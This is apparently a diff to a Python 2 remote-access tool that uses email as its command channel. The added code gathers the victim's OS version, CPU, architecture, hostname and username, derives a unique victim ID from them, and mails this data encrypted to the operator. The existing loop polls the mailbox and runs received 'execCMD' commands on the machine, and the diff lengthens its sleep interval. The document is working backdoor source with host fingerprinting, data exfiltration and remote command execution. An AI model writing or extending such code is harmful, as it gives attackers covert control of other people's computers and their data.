@@ -8,9 +8,11 @@ import json
 import random
 import hashlib
 import platform
+import getpass
 import threading
 import time
 import subprocess
+import requests
 
 from smtplib import SMTP
 from email.MIMEMultipart import MIMEMultipart
@@ -32,6 +34,28 @@ EMAIL_TIME_OUT = 60
 ##########################################
 
 clientid = hashlib.sha256('huangsibo lololo').hexdigest()
+
+#
+class systemInfo:
+
+	def __init__(self):
+		self.systemver = platform.platform()
+		self.architecture = platform.machine()
+		self.CPU = platform.processor()
+		self.PCname = platform.node()
+		self.User = getpass.getuser()
+
+
+		self.UniqueID = hashlib.sha256(
+			self.architecture +
+			self.CPU +
+			self.systemver +
+			self.User +self.PCname).hexdigest()
+
+sys_obj=systemInfo()
+clientid = sys_obj.UniqueID
+
+
 #siboer.py 中的·
 class InfoSecury:
 
@@ -106,14 +130,22 @@ class sendEmail(threading.Thread):
 			sub_header = 'Client:{} {}'.format(clientid,self.jobid)
 		elif self.checkin:
 			sub_header = 'This:{}'.format(clientid)
+			print "this is <{}>".format(sub_header)
 
 		msg = MIMEMultipart()
 		msg['From'] = sub_header
 		msg['To'] = EMAIL_USERNAME
 		msg['Subject'] = sub_header
-		msgtext = json.dumps(self.text)
+		msgtext = json.dumps(
+			{'os':sys_obj.systemver,
+			'user':sys_obj.User,
+			'arc':sys_obj.architecture,
+			'PCname':sys_obj.PCname,
+			'msg':self.text
+
+			})
 		#print msgtext
-		msg_str=being_secure.encrypt(json.dumps(msgtext))
+		msg_str=being_secure.encrypt(msgtext)
 		#print msg_str
 		msg.attach(MIMEText(msg_str))
 
@@ -142,19 +174,18 @@ def checkJobs():
 			msg = MessageParser(msg_data)
 			cmd = msg.infodict['cmd']
 			args = msg.infodict['arg']
-			print msg.subject
 			jobid = msg.subject.split()[1]
 
 			if cmd == 'execCMD':
 				a = execCMD(args,jobid)
 				a.start()
 
-		time.sleep(5)
+		time.sleep(60)
 
 
 
 if __name__ == '__main__':
-	sendEmail('test email',checkin=True)
+	sendEmail(clientid,checkin=True)
 	try:
 		checkJobs()
 	except KeyboardInterrupt:
